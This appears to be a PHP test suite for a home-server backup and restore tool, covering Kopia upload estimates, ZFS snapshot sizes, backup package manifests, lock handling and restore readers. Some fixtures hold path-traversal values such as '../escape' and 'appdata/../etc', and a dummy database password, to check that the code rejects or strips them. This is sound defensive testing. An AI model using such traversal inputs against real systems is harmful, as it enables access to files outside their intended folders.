           '6000' => ['kopia', 'server', 'start', '--address=0.0.0.0:51515']];
    foreach ($ps as $pid => $argv) {
        @mkdir("$proc/$pid", 0700, true);
        file_put_contents("$proc/$pid/cmdline", implode("\0", $argv) . "\0");
    }
    file_put_contents("$proc/4456/io", "rchar: 2390370860668\nwchar: 1180491244705\nsyscr: 36974388\nsyscw: 73561450\nread_bytes: 3466402299392\n");
    same('first upload: the Kopia process of the source (not the docker client, not another source)', [4456, 4456, null],
        [backupKopiaPid('/backup-snapshots/Backups_statisch', '/Backups_statisch', $proc), backupKopiaPid(null, '/Backups_statisch', $proc),
         backupKopiaPid('/backup-snapshots/isos', '/isos', $proc)]);
    same('first upload: what it has read (rchar, not what it sent)', [2390370860668, null], [backupProcRead(4456, $proc), backupProcRead(3123, $proc)]);
    exec('rm -rf ' . escapeshellarg($proc));

    $zfs = "ripley/Backups_statisch@uso-backup-20261005-0100\t2355000000000\nripley/Backups_statisch@uso-backup-20261006-0100\t2355490998272\n"
         . "ripley/Backups_statisch/child@uso-backup-20261006-0100\t1000\nripley/Backups_statisch/child@other\t5\n";
    same('first upload: the size of this run\'s snapshot, child datasets too', [2355490999272, null],
        [backupZfsSnapSum($zfs, 'uso-backup-20261006-0100'), backupZfsSnapSum($zfs, 'uso-backup-20261007-0100')]);

    // nostromo, 2026-10-06: Backups_statisch from 04:18:47; at 13:20 the snapshot (2.36 TB) was read past its size — done 13:27:58
    $c = ['source' => 'Backups_statisch', 'size' => 2355490998272, 'looks' => []];
    [$c, $o] = backupUploadStep($c, 1791253127, 2390370860668, 1791285605);
    same('first upload: the first look — the average since it started, any moment now', ['Backups_statisch', true, 73599694, 0, 1],
        [$o['source'], $o['first'], $o['rate'], $o['left'], count($c['looks'])]);
    // a made-up one: 1 TB, 100 MB/s on average, 50 MB/s for the last minutes
    $t0 = 1000000;
    $c = ['source' => 'x', 'size' => 10 ** 12, 'looks' => []];
    [$c, $o] = backupUploadStep($c, $t0, 0, $t0 + 30);
    same('first upload: too early for a rate', [null, null, 0], [$o['rate'], $o['left'], $o['read']]);
    [$c, $o] = backupUploadStep($c, $t0, 360 * 10 ** 9, $t0 + 3600);
    same('first upload: from the newest look before the last 15 minutes', [100840336, 6347], [$o['rate'], $o['left']]);
    [$c, $o] = backupUploadStep($c, $t0, 360 * 10 ** 9 + 300 * 50 * 10 ** 6, $t0 + 3900);
    same('first upload: the rate between looks minutes apart', [50000000, 12500], [$o['rate'], $o['left']]);
    for ($t = $t0 + 3920; $t <= $t0 + 6000; $t += 5) {
        [$c] = backupUploadStep($c, $t0, 375 * 10 ** 9 + ($t - $t0 - 3900) * 50 * 10 ** 6, $t);
    }
    check('first upload: a look every 20 seconds, the last 15 minutes and one before', count($c['looks']) <= BACKUP_UPLOAD_KEEP / 20 + 2
        && $t0 + 6000 - $c['looks'][0][0] > BACKUP_UPLOAD_KEEP && $t0 + 6000 - $c['looks'][1][0] <= BACKUP_UPLOAD_KEEP, json_encode([count($c['looks']), $c['looks'][0] ?? null]));
    [, $o] = backupUploadStep(['source' => 'x', 'size' => null, 'looks' => []], $t0, 10 ** 9, $t0 + 600);
    same('first upload: no size, no estimate (but a rate)', [null, 1666667], [$o['left'], $o['rate']]);
}

/**
 * Mr. Backupsy's packages (engine 2.18): the office's reader on a made-up backup place, and the
 * engine's own helpers (lib/common.sh section 8: folder names, old run folders, an interrupted swap)
 */
function testBackupPackages(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-packages-' . getmypid();
    $put = function (string $file, mixed $data) use ($tmp): void {
        @mkdir(dirname("$tmp/$file"), 0700, true);
        file_put_contents("$tmp/$file", is_string($data) ? $data : json_encode($data));
    };
    $put('server/run.json', ['run' => '20261006-0200', 'result' => 'ok', 'files' => [['path' => 'libvirt.tar.gz', 'bytes' => 9, 'run' => '20261005-0200']]]);
    $put('server/libvirt.tar.gz', 'x');
    $put('apps/immich/manifest.json', ['name' => 'immich', 'type' => 'compose', 'run' => '20261006-0200', 'result' => 'warnings',
        'compose' => ['manager_dir' => 'immich'],
        'containers' => [['name' => 'immich_postgres', 'image' => 'ghcr.io/immich-app/postgres:14', 'digests' => ['ghcr.io/immich-app/postgres@sha256:ab'], 'inspect' => ['Id' => 'x']]],
        'dumps' => [['container' => 'immich_postgres', 'type' => 'postgres', 'state' => 'failed', 'login' => 'user', 'user_var' => 'POSTGRES_USER',
                     'password_var' => 'POSTGRES_PASSWORD', 'client' => 'psql', 'secret' => 'never']],
        'files' => [['path' => 'db/postgres_immich_postgres.sql.gz', 'bytes' => 100, 'run' => '20261005-0200', 'what' => 'dump', 'container' => 'immich_postgres'],
                    ['path' => 'compose/docker-compose.yml', 'bytes' => 20, 'run' => '20261006-0200', 'what' => 'compose']]]);
    $put('apps/gone/manifest.json', ['name' => 'gone', 'type' => 'template', 'run' => '20261001-0200', 'files' => []]);
    $put('apps/.ub-old-20261006-0200-immich/manifest.json', ['name' => 'aside']);
    $put('vms/Win_11/manifest.json', ['name' => 'Win 11', 'run' => '20261006-0200', 'xml' => 'Win_11.xml', 'uuid' => 'u-1', 'autostart' => true,
        'files' => [['path' => 'Win_11.xml', 'bytes' => 5], ['path' => 'nvram/u-1_VARS-pure-efi-tpm.fd', 'bytes' => 7], ['path' => 'tpm/u-1/tpm2/tpm2-00.permall', 'bytes' => 3]]]);
    $put('flash/manifest.json', ['run' => '20261006-0200', 'files' => [['path' => 'flash.tar.gz', 'bytes' => 4, 'run' => '20261004-0200']]]);
    $put('flash/flash.tar.gz', 'flsh');
    $put('20261001-0200/db/mariadb_x_y.sql.gz', 'x');            // an old run folder: the next run clears it away
    $put('20261002-0200/notes.txt', 'mine');                       // holds something else: stays, not counted

    $p = backupPackagesRead($tmp);
    same('packages: the last run', '20261006-0200', $p['run']);
    same('packages: apps, hidden folders left out', ['gone', 'immich'], array_column($p['apps'], 'folder'));
    same('packages: an app of an earlier run is stale', [true, false], array_column($p['apps'], 'stale'));
    $immich = $p['apps'][1];
    $dump = array_values(array_filter($immich['files'], fn ($f) => $f['what'] === 'dump'))[0] ?? [];
    same('packages: a kept dump keeps its run', ['20261005-0200', 'immich_postgres'], [$dump['run'] ?? null, $dump['container'] ?? null]);
    same('packages: dump credentials as names only', ['container' => 'immich_postgres', 'type' => 'postgres', 'state' => 'failed', 'login' => 'user',
        'user_var' => 'POSTGRES_USER', 'password_var' => 'POSTGRES_PASSWORD', 'client' => 'psql'], $immich['dumps'][0] ?? null);
    same('packages: no docker inspect for the page', ['name', 'image', 'digest', 'template'], array_keys($immich['containers'][0] ?? []));
    same('packages: bytes from the manifest', 120, $immich['bytes']);
    $vm = $p['vms'][0] ?? [];
    same('packages: a VM with NVRAM and TPM', ['Win 11', ['u-1_VARS-pure-efi-tpm.fd'], true, true, false],
        [$vm['name'] ?? null, $vm['nvram'] ?? null, $vm['tpm'] ?? null, $vm['autostart'] ?? null, $vm['snapshotdb'] ?? null]);
    same('packages: the libvirt archive in server/', "$tmp/server/libvirt.tar.gz", $p['server']['libvirt'] ?? null);
    same('packages: the flash archive keeps its run', '20261004-0200', $p['flash']['run'] ?? null);
    same('packages: old run folders the engine clears away', 1, $p['old_runs']);
    exec('rm -rf ' . escapeshellarg($tmp));

    // the engine's helpers, in bash
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("source $lib >/dev/null 2>&1; $script") . ' 2>&1'));
    same('engine: folder names', 'Windows_11__G__ming_|_hidden|immich|_|', $sh('printf "%s|" "$(pkg_folder "Windows 11 (Gäming)")" "$(pkg_folder ".hidden")" "$(pkg_folder immich)" "$(pkg_folder "")"'));
    $t = escapeshellarg(sys_get_temp_dir() . '/office-tests-engine-' . getmypid());
    same('engine: old run folders', '20261001-0200,20261003-0200', $sh("T=$t; mkdir -p \$T/20261001-0200/db \$T/20261002-0200 \$T/20261003-0200/manifest \$T/2026-x \$T/apps;"
        . ' echo x >$T/20261002-0200/mine.txt; : >$T/20261003-0200/libvirt.tar.gz; old_runs_list $T | xargs -n1 basename | paste -sd, -'));
    same('engine: an interrupted swap is put right', 'apps:a b|vms:v|left:0', $sh("T=$t; rm -rf \$T; mkdir -p \$T/apps/a \$T/apps/.ub-old-20261006-0200-a \$T/apps/.ub-old-20261006-0200-b"
        . ' $T/vms/.ub-old-20261006-0200-v $T/.ub-stage-20261006-0200/apps/a; touch $T/apps/a/new; pkg_recover $T >/dev/null;'
        . ' printf "apps:%s|vms:%s|left:%s" "$(ls $T/apps | paste -sd" " -)" "$(ls $T/vms)" "$(ls -A $T | grep -c "^\.ub-")"; [ -e $T/apps/a/new ] || echo " lost"'));
    exec('rm -rf ' . $t);
}

/**
 * Mr. Backupsy's Kopia per app and VM (engine 2.19): the engine's items, the rules the shares get for their
 * parts, the targets, the checks of settings.ini, sleeping disks, SQLite URIs; settings.ini of 2.18 (no
 * [app] sections) gives the very same rules as before; the office's reader of policies and packages.
 */
function testBackupKopiaItems(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-items-' . getmypid();
    @mkdir($tmp, 0700, true);
    $ini = "[general]\ndumps_share = UnraidSecretaryOffice\nmount_root = /mnt/addons/UnraidSecretaryOffice/snapshots\n"
         . "[kopia]\nenabled = yes\n[share \"appdata\"]\nmode = kopia\nkopia_ignore = /kopia/\n[share \"UnraidSecretaryOffice\"]\nmode = kopia\n";
    file_put_contents("$tmp/old.ini", $ini);
    file_put_contents("$tmp/new.ini", $ini
        . "[app \"nextcloud\"]\nkopia = yes\nfolder = appdata/nextcloud\nkopia_retention = 7 0 14 8 24 5\nkopia_ignore = /appdata/nextcloud/data/cache/\n"
        . "[app \"my app\"]\nkopia = yes\nfolder = appdata/myapp\n[app \"my_app\"]\nkopia = yes\n[app \"left\"]\nkopia = no\nfolder = appdata/left\n"
        . "[vm \"Win 11\"]\nmode = snapshot\nprepare = freeze\nkopia = yes\nfolder = domains/Win 11\n");
    file_put_contents("$tmp/bad.ini", $ini . "[app \"x\"]\nkopia = maybe\nfolder = appdata/../etc\nfolder = /appdata/x\nkopia_retention = 7 7\n");
    file_put_contents("$tmp/disks.ini", "[\"disk1\"]\nname=\"disk1\"\nspundown=\"0\"\n[\"disk10\"]\nname=\"disk10\"\nspundown=\"1\"\n"
        . "[\"master\"]\nname=\"master\"\nspundown=\"0\"\n[\"master2\"]\nname=\"master2\"\nspundown=\"1\"\n[\"ripley\"]\nname=\"ripley\"\nspundown=\"0\"\n");
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $sh = function (string $file, string $script) use ($lib, $tmp): string {
        $pre = "UB_DATA=$tmp/data UB_DISKS_INI=$tmp/disks.ini; source $lib >/dev/null 2>&1; cfg_load $tmp/$file; cfg_validate >/dev/null; apply_settings;"
             . ' INV_METHOD[appdata]=snap; INV_LAYOUT[appdata]=single; INV_LOCS[appdata]="master|zfs|master/appdata|"$\'\\n\';'
             . ' INV_METHOD[UnraidSecretaryOffice]=snap; INV_LAYOUT[UnraidSecretaryOffice]=single; PLAN_KOPIA=(UnraidSecretaryOffice appdata); PLAN_FLASH=off;';
        return trim((string) shell_exec('bash -c ' . escapeshellarg("$pre $script") . ' 2>&1'));
    };
    $md5 = substr(md5('my_app'), 0, 6);
    same('items: apps first (sorted), then VMs; a name that comes out the same gets a suffix; kopia = no is none',
        "app|my app|my_app\napp|my_app|my_app-$md5\napp|nextcloud|nextcloud\nvm|Win 11|Win_11", $sh('new.ini', 'kopia_items'));
    same('items: an app\'s parts - its folders, then its package', "appdata|nextcloud\nUnraidSecretaryOffice|backup/apps/nextcloud",
        $sh('new.ini', 'kopia_item_parts app nextcloud'));
    same('items: a VM\'s package', "domains|Win 11\nUnraidSecretaryOffice|backup/vms/Win_11", $sh('new.ini', 'kopia_item_parts vm "Win 11"'));
    same('items: the share leaves their folders out, besides its own rules', "/kopia/\n/myapp/\n/nextcloud/", $sh('new.ini', 'kopia_want_ignores share appdata'));
    same('items: the backup place leaves their packages out', "/backup/apps/my_app/\n/backup/apps/nextcloud/\n/backup/vms/Win_11/",
        $sh('new.ini', 'kopia_want_ignores share UnraidSecretaryOffice'));
    same('items: a split share gets a rule per base', "/disk1/myapp/\n/disk1/nextcloud/\n/kopia/\n/master/myapp/\n/master/nextcloud/",
        $sh('new.ini', 'INV_LAYOUT[appdata]=split; INV_LOCS[appdata]="master|zfs|x|"$\'\\n\'"disk1|btrfs|/mnt/disk1|appdata"; kopia_want_ignores share appdata'));
    same('items: own rules and retention, or inherited', "/appdata/nextcloud/data/cache/|7 0 14 8 24 5|inherit inherit inherit inherit inherit inherit",
        $sh('new.ini', 'printf "%s|%s|%s" "$(kopia_want_ignores app nextcloud)" "$(kopia_want_retention app nextcloud)" "$(kopia_want_retention app "my app")"'));
    $root = '/mnt/addons/UnraidSecretaryOffice/snapshots';
    same('items: the targets', "root|$root|\nshare|$root/UnraidSecretaryOffice|UnraidSecretaryOffice\nshare|$root/appdata|appdata\n"
        . "app|$root/.apps/my_app|my app\napp|$root/.apps/my_app-$md5|my_app\napp|$root/.apps/nextcloud|nextcloud\nvm|$root/.vms/Win_11|Win 11",
        $sh('new.ini', 'kopia_targets'));
    same('items: none with Kopia off', '', $sh('new.ini', 'KOPIA_ENABLED=no; kopia_items'));
    same('settings.ini of 2.18: no items, the same rules and targets as before', "|/kopia/|root|$root|\nshare|$root/UnraidSecretaryOffice|UnraidSecretaryOffice\nshare|$root/appdata|appdata",
        $sh('old.ini', 'printf "%s|%s|%s" "$(kopia_items)" "$(kopia_want_ignores share appdata)" "$(kopia_targets)"'));
    same('items: settings.ini valid', '0', $sh('new.ini', 'echo ${#CFG_ERRORS[@]}'));
    same('items: bad keys found', '4', $sh('bad.ini', 'echo ${#CFG_ERRORS[@]}'));
    same('engine: sleeping disks (a pool sleeps with any of its disks, disk1 is not disk10)', 'master disk10',
        $sh('new.ini', 'for b in master disk1 disk10 ripley mast; do ub_base_asleep $b && printf "%s " $b; done'));
    same('engine: a path for an SQLite URI', '/a%20b/Plug-in%20Support/%C3%A4%3F%23.db', $sh('new.ini', 'uri_escape "/a b/Plug-in Support/ä?#.db"'));
    same('engine: a container path on the host', '/mnt/user/appdata/plex/Library/x|/mnt/user/Backups/Emby|1',
        $sh('new.ini', 'CT_BINDS[c]="/mnt/user/appdata/plex|/config|true"$\'\\n\'"/mnt/user/Backups/Emby|/config/backup|true";'
            . ' printf "%s|%s|" "$(ct_host_path c /config/Library/x)" "$(ct_host_path c /config/backup)"; ct_host_path c /data || echo 1'));
    exec('rm -rf ' . escapeshellarg($tmp));

    // the office: policies of apps and VMs, and what a package says about its databases and the app's own backups
    $pol = backupPolicies([['kind' => 'app', 'share' => '', 'name' => 'nextcloud', 'path' => '/backup-snapshots/.apps/nextcloud', 'ok' => true, 'differences' => []],
                           ['kind' => 'share', 'share' => 'appdata', 'path' => '/backup-snapshots/appdata', 'ok' => false, 'differences' => [['what' => 'ignore_missing', 'item' => '/nextcloud/']]],
                           ['kind' => 'odd', 'share' => 'x']]);
    same('policies: apps and VMs, the name (older engines: the share)', [['app', 'nextcloud'], ['share', 'appdata']], array_map(fn ($p) => [$p['kind'], $p['name']], $pol));
    $tmp = sys_get_temp_dir() . '/office-tests-items-pk-' . getmypid();
    @mkdir("$tmp/apps/emby", 0700, true);
    @mkdir("$tmp/server", 0700, true);
    file_put_contents("$tmp/server/run.json", json_encode(['run' => '20261006-0200']));
    file_put_contents("$tmp/apps/emby/manifest.json", json_encode(['name' => 'EmbyServer', 'type' => 'template', 'run' => '20261006-0200',
        'sqlite' => [['container' => 'EmbyServer', 'file' => 'db/sqlite_EmbyServer_library.db', 'source' => '/mnt/user/appdata/EmbyServer/data/library.db',
                      'path' => '/config/data/library.db', 'state' => 'unchanged', 'check' => 'ok', 'present' => true]],
        'own_backups' => [['kind' => 'emby', 'container' => 'EmbyServer', 'path' => '/mnt/user/Backups/EmbyServer', 'files' => 3, 'newest' => 1791200000, 'asleep' => false],
                          ['kind' => 'odd', 'path' => '/etc']],
        'files' => [['path' => 'db/sqlite_EmbyServer_library.db', 'bytes' => 9, 'run' => '20261006-0200', 'what' => 'sqlite', 'container' => 'EmbyServer']]]));
    $a = backupPackagesRead($tmp)['apps'][0] ?? [];
    same('packages: the SQLite copies', ['/config/data/library.db', 'unchanged', 'ok', true], [$a['sqlite'][0]['path'] ?? null, $a['sqlite'][0]['state'] ?? null, $a['sqlite'][0]['check'] ?? null, $a['sqlite'][0]['present'] ?? null]);
    same('packages: the app\'s own backups, known kinds only', [['emby', '/mnt/user/Backups/EmbyServer', 3]], array_map(fn ($o) => [$o['kind'], $o['path'], $o['files']], $a['own_backups'] ?? []));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Engine 2.20: a run that finds the lock busy is skipped, never silent — the engine's helpers (the holder
 * note, skipped.json, the history line, the history's own lock) on a temporary data folder, and the
 * office's side: who holds the lock, skips kept apart from the runs (history, estimates, the last run),
 * the Dashboard tile. Nothing runs backup.sh; a stand-in "backup.sh" only sleeps.
 */
function testBackupSkip(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-skip-' . getmypid();
    @mkdir("$tmp/data/state", 0700, true);
    @mkdir("$tmp/data/logs", 0700, true);
    file_put_contents("$tmp/backup.sh", "sleep 30\n");
    $sleeper = proc_open(['bash', "$tmp/backup.sh"], [], $pipes);
    $sleeperPid = (int) proc_get_status($sleeper)['pid'];
    $lib = escapeshellarg(OFFICE_DIR . '/backup/lib/common.sh');
    $state = "$tmp/data/state";
    $sh = fn (string $script) => trim((string) shell_exec('bash -c ' . escapeshellarg("UB_DATA=$tmp/data; source $lib >/dev/null 2>&1; TS=20261007-0100; $script") . ' 2>&1'));
    $note = fn (array $n) => file_put_contents("$state/lock-holder.json", json_encode($n));
    $read = 'ub_holder_read; printf "%s|%s|%s|%s|%s" "$HOLDER_KIND" "$HOLDER_MODE" "$HOLDER_WHAT" "$HOLDER_RUN" "$HOLDER_STARTED"';

    // the engine: who holds the lock - trusted only while its pid lives (and runs backup.sh / setup.sh)
    same('engine holder: no note - other', 'other||||0', $sh($read));
    $note(['holder' => 'backup', 'mode' => 'check', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 1791241200]);
    same('engine holder: a check of backup.sh', 'check|check||20261006-0100|1791241200', $sh($read));
    $note(['holder' => 'backup', 'mode' => 'backup', 'run' => '20261006-0100', 'pid' => getmypid(), 'started' => 1]);
    same('engine holder: the pid runs something else - other', 'other||||0', $sh($read));
    $note(['holder' => 'restore', 'what' => "next\ncloud", 'pid' => getmypid(), 'started' => 5]);
    same('engine holder: a restore, control characters gone', 'restore||next cloud||5', $sh($read));
    $note(['holder' => 'restore', 'what' => 'x', 'pid' => 4194305, 'started' => 5]);
    same('engine holder: a dead pid - other', 'other||||0', $sh($read));
    @unlink("$state/lock-holder.json");
    file_put_contents("$state/status.json", json_encode(['mode' => 'backup', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 9, 'result' => 'running']));
    same('engine holder: no note, but status.json names a running backup.sh (an engine before 2.20)', 'backup|backup||20261006-0100|9', $sh($read));
    file_put_contents("$state/status.json", json_encode(['mode' => 'backup', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 9, 'result' => 'ok']));
    same('engine holder: no note, status.json not running - other', 'other||||0', $sh($read));
    @unlink("$state/status.json");
    same('engine holder: written with its own pid', 'backup|dryrun|20261007-0100|7|true',
        $sh('ub_holder_write backup dryrun "$TS" 7; jq -r --argjson me $$ \'[.holder, .mode, .run, .started, (.pid == $me)] | map(tostring) | join("|")\' "$UB_STATE/lock-holder.json"'));
    same('engine holder: its own note cleared', '0', $sh('ub_holder_write setup plan "$TS" 1; ub_holder_clear; ls "$UB_STATE" | grep -c lock-holder'));
    $note(['holder' => 'restore', 'pid' => $sleeperPid]);
    same("engine holder: another's note stays", '1', $sh('ub_holder_clear; ls "$UB_STATE" | grep -c lock-holder'));

    // a skipped run: skipped.json always, a history line only for a real backup run
    $note(['holder' => 'backup', 'mode' => 'backup', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 1791241200]);
    file_put_contents("$state/history.jsonl", json_encode(['run' => '20261006-0100', 'started' => 100, 'finished' => 500, 'result' => 'ok', 'kopia' => ['done' => [['name' => 'appdata', 'ok' => true, 'seconds' => 300, 'finished' => 450]]]]) . "\n");
    $sh('ub_holder_read; status_skipped check skipped_busy_backup kopia appdata');
    $j = readJson("$state/skipped.json");
    same('engine skip: a check - skipped.json', ['check', 'skipped', 'skipped_busy_backup', 'backup', 'kopia', 'appdata', '20261006-0100'],
        [$j['mode'] ?? null, $j['result'] ?? null, $j['reason'] ?? null, $j['holder']['kind'] ?? null, $j['holder']['phase'] ?? null, $j['holder']['current'] ?? null, $j['holder']['run'] ?? null]);
    same('engine skip: a check - no history line', 1, count(file("$state/history.jsonl")));
    $sh('ub_holder_read; status_skipped backup skipped_busy_backup kopia appdata');
    $lines = file("$state/history.jsonl", FILE_IGNORE_NEW_LINES);
    same('engine skip: a backup - a history line', [2, 'skipped', '20261007-0100'], [count($lines), json_decode($lines[1], true)['result'] ?? null, json_decode($lines[1], true)['run'] ?? null]);
    same('engine skip: status.json untouched', false, is_file("$state/status.json"));
    same('engine history: the last UB_HISTORY_MAX lines', '3|l3|l5', $sh('UB_HISTORY_MAX=3; for i in 1 2 3 4 5; do history_append "{\"l\":\"l$i\"}"; done;'
        . ' printf "%s|%s|%s" "$(wc -l <"$UB_STATE/history.jsonl")" "$(head -1 "$UB_STATE/history.jsonl" | jq -r .l)" "$(tail -1 "$UB_STATE/history.jsonl" | jq -r .l)"'));

    // the office: skips are no runs - history, estimates and the last run never see them
    file_put_contents("$state/history.jsonl", implode("\n", [
        json_encode(['run' => '20261005-0100', 'started' => 1000, 'finished' => 1600, 'result' => 'ok', 'downtime_s' => 60,
                     'kopia' => ['done' => [['name' => 'appdata', 'ok' => true, 'seconds' => 400, 'finished' => 1500]]]]),
        json_encode(['run' => '20261006-0100', 'started' => 2000, 'finished' => 2000, 'result' => 'skipped', 'time' => 2000, 'mode' => 'backup',
                     'reason' => 'skipped_busy_backup', 'holder' => ['kind' => 'backup', 'started' => 1000, 'phase' => 'kopia', 'current' => 'appdata']]),
        json_encode(['run' => '20261006-0100', 'started' => 2100, 'finished' => 2100, 'result' => 'skipped', 'time' => 2100, 'mode' => 'odd',
                     'reason' => 'skipped_busy_x', 'holder' => ['kind' => '<b>', 'what' => str_repeat('a', 200)]]),
    ]) . "\n");
    $history = backupHistory([], null, $skips, "$state/history.jsonl");
    same('office history: the skipped lines are no runs', ['20261005-0100'], array_column($history, 'run'));
    same('office history: skips newest first, unknown holder = other', [[2100, 'skipped_busy_other', 'other', 'backup'], [2000, 'skipped_busy_backup', 'backup', 'backup']],
        array_map(fn ($k) => [$k['time'], $k['reason'], $k['holder']['kind'], $k['mode']], $skips));
    same('office history: texts from the engine kept short', 80, mb_strlen($skips[0]['holder']['what']));
    same('office history: estimates from the runs only', 600, backupEstimates($history)['total']);
    same('office: not a skip', null, backupSkipRow(['result' => 'ok']));

    // who holds the lock, for the office (Mr. Backupsy, Mr. Restori)
    same('office holder: nobody holds the lock', null, backupLockHolder("$tmp/data"));
    $lock = fopen("$state/lock", 'c');
    flock($lock, LOCK_EX);
    $note(['holder' => 'backup', 'mode' => 'dryrun', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 1791241200]);
    same('office holder: a dry run of backup.sh', ['dryrun', '20261006-0100', 1791241200], array_values(array_intersect_key(backupLockHolder("$tmp/data") ?? [], ['holder' => 1, 'run' => 1, 'started' => 1])));
    $note(['holder' => 'setup', 'mode' => 'plan', 'pid' => $sleeperPid]);
    same('office holder: "setup" but the pid runs backup.sh - other', 'other', backupLockHolder("$tmp/data")['holder'] ?? null);
    $note(['holder' => 'restore', 'what' => 'nextcloud', 'pid' => getmypid(), 'started' => 7]);
    same('office holder: a restore', ['restore', 'nextcloud'], [backupLockHolder("$tmp/data")['holder'] ?? null, backupLockHolder("$tmp/data")['what'] ?? null]);
    $note(['holder' => 'restore', 'pid' => 4194305]);
    same('office holder: a dead pid - other', 'other', backupLockHolder("$tmp/data")['holder'] ?? null);
    @unlink("$state/lock-holder.json");
    same('office holder: no note - other', 'other', backupLockHolder("$tmp/data")['holder'] ?? null);
    file_put_contents("$state/status.json", json_encode(['mode' => 'check', 'run' => '20261006-0100', 'pid' => $sleeperPid, 'started' => 9, 'result' => 'running']));
    same('office holder: no note, a running check in status.json (an engine before 2.20)', ['check', 9], [backupLockHolder("$tmp/data")['holder'] ?? null, backupLockHolder("$tmp/data")['started'] ?? null]);
    @unlink("$state/status.json");
    flock($lock, LOCK_UN);
    fclose($lock);

    // the Dashboard tile: a skip newer than the last run shows, an older one doesn't
    require_once OFFICE_DIR . '/src/dashboard.php';
    $last = ['result' => 'ok', 'started' => 1000, 'finished' => 1600];
    same('dashboard: a skip after the last run', ['backup.dash_skipped', 'orange', 2000], officeDashBackupState(['history' => [$last], 'skips' => [['time' => 2000]]]));
    same('dashboard: a run after the skip', ['dash.bk_ok', 'green', 1600], officeDashBackupState(['history' => [$last], 'skips' => [['time' => 900]]]));
    same('dashboard: running beats a skip', ['dash.bk_running', 'orange', null], officeDashBackupState(['running' => true, 'history' => [$last], 'skips' => [['time' => 2000]]]));
    same('dashboard: nothing yet', ['dash.bk_none', 'orange', null], officeDashBackupState([]));

    proc_terminate($sleeper);
    proc_close($sleeper);
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * Mr. Restori: his own reader of the packages (dumps with their database and the credentials' variable
 * names, the folders a container binds, templates, compose files, stale packages), share paths, database types.
 */
function testRestore(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-restore-' . getmypid();
    $put = function (string $file, mixed $data) use ($tmp): void {
        @mkdir(dirname("$tmp/$file"), 0700, true);
        file_put_contents("$tmp/$file", is_string($data) ? $data : json_encode($data));
    };
    $put('server/run.json', ['run' => '20261006-0200', 'result' => 'ok', 'files' => []]);
    $put('apps/nextcloud/manifest.json', ['name' => 'nextcloud', 'type' => 'compose', 'run' => '20261006-0200', 'result' => 'ok',
        'compose' => ['project' => 'nextcloud', 'manager_dir' => 'nextcloud', 'working_dir' => '/boot/x', 'config_files' => ['/boot/x/compose.yaml']],
        'containers' => [
            ['name' => 'nextcloud-db', 'image' => 'mariadb:11.4', 'digests' => ['mariadb@sha256:ab'],
             'inspect' => ['Config' => ['Env' => ['MARIADB_VERSION=11.4', 'MARIADB_PASSWORD=secret']],
                           'Mounts' => [['Type' => 'bind', 'Source' => '/mnt/user/appdata/nextcloud/db/', 'Destination' => '/var/lib/mysql', 'RW' => true],
                                        ['Type' => 'volume', 'Source' => '/var/lib/docker/volumes/x', 'Destination' => '/x']]]],
            ['name' => 'nextcloud-app', 'image' => 'nextcloud:31', 'digests' => [], 'inspect' => ['Config' => ['Env' => []], 'Mounts' => []]],
        ],
        'dumps' => [['container' => 'nextcloud-db', 'type' => 'mariadb', 'state' => 'failed', 'login' => 'user', 'user_var' => 'MARIADB_USER',
                     'password_var' => 'MARIADB_PASSWORD', 'client' => 'mariadb']],
        'nextcloud' => [['container' => 'nextcloud-app', 'occ' => '/var/www/html/occ', 'user' => 'www-data', 'same_as' => '']],
        'files' => [['path' => 'db/mariadb_nextcloud-db_nextcloud.sql.gz', 'bytes' => 100, 'run' => '20261005-0200', 'what' => 'dump', 'container' => 'nextcloud-db'],
                    ['path' => 'compose/compose.yaml', 'bytes' => 20, 'run' => '20261006-0200', 'what' => 'compose'],
                    ['path' => '../escape', 'bytes' => 1, 'run' => '20261006-0200', 'what' => 'other']]]);
    $put('apps/emby/manifest.json', ['name' => 'EmbyServer', 'type' => 'template', 'run' => '20261001-0200',
        'containers' => [['name' => 'EmbyServer', 'image' => 'emby/embyserver', 'template' => 'my-EmbyServer.xml']],
        'files' => [['path' => 'my-EmbyServer.xml', 'bytes' => 9, 'run' => '20261001-0200', 'what' => 'template']]]);
    $put('vms/Win/manifest.json', ['name' => 'Win', 'run' => '20261006-0200', 'xml' => 'Win.xml', 'uuid' => '43CD8087-9364-2C3D-EB36-29696480E7D8',
        'disks' => [['source' => '/mnt/user/domains/Win/vdisk1.img', 'snapshot' => 'master/domains/Win@unraidbackup-20261006-0200', 'share' => 'domains']],
        'files' => [['path' => 'Win.xml', 'bytes' => 5, 'what' => 'xml'], ['path' => 'nvram/43cd8087-9364-2c3d-eb36-29696480e7d8_VARS-pure-efi.fd', 'bytes' => 7, 'what' => 'nvram']]]);
    $put('vms/Win/Win.xml', '<domain><hostdev/><hostdev/></domain>');
    $p = rsPackages($tmp);
    same('restore: apps by name', ['EmbyServer', 'nextcloud'], array_column($p['apps'], 'name'));
    same('restore: a package of an earlier run is stale', [true, false], array_column($p['apps'], 'stale'));
    $nc = $p['apps'][1];
    same('restore: a kept dump with its database and the variables only', ['db/mariadb_nextcloud-db_nextcloud.sql.gz', 'nextcloud', true, 'user', 'MARIADB_USER', 'MARIADB_PASSWORD'],
        [$nc['dumps'][0]['file'] ?? null, $nc['dumps'][0]['db'] ?? null, $nc['dumps'][0]['kept'] ?? null, $nc['dumps'][0]['login'] ?? null,
         $nc['dumps'][0]['user_var'] ?? null, $nc['dumps'][0]['password_var'] ?? null]);
    same('restore: no secrets in the package as read', false, str_contains(json_encode($p), 'secret'));
    same('restore: binds only, without the trailing slash', [['source' => '/mnt/user/appdata/nextcloud/db', 'dest' => '/var/lib/mysql', 'rw' => true]], $nc['containers'][0]['binds']);
    same('restore: database types from env and image', ['mariadb', null], array_column($nc['containers'], 'db'));
